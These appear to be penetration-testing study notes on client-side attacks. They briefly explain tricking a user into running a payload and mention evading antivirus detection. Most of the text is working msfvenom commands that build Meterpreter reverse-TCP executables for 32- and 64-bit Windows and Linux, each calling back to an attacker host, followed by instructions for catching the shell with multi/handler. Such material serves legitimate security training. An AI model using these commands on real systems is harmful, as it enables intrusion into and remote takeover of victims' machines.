#### Basic Theory
- A client side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed.
- Client side attacks typically utilize various social engineering techniques like generating malicious decuments or portable executables (PEs)
- Client side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
- Given that this attack vector involves the transfer and storage of a malicious payload on the clients system disk,attackers need to be cognisant of av detection.

#### Creating paylaods
- msfvenom [ list all the available help menu]
- msfvenom --list payloads [ list all the available payloads ]
- msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > payload1.exe [ a flag is used to set architecture here x86 means it's 32 bit p flag is used to specify payload ]
- msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > payload2.exe [ a payload for 64 bit windows machine ]
- msfvenom --list formats [ this will list all the available payload output format ]
- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf >payload3 [ this will create a linux reverse shell for 32 bit machine ]
-  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf >payload4 [ this will create a payload for linux 64 bit machine ]

#### Transfering file
- after creating we need to transfer the file
- we will use multi/handler  meterpreter module to get meterpreter shell as we generate meterpreter payloads
- We need to configure multi/handler variables those matching with payload,lhost,lport while the creating shell by msfvenom 
  
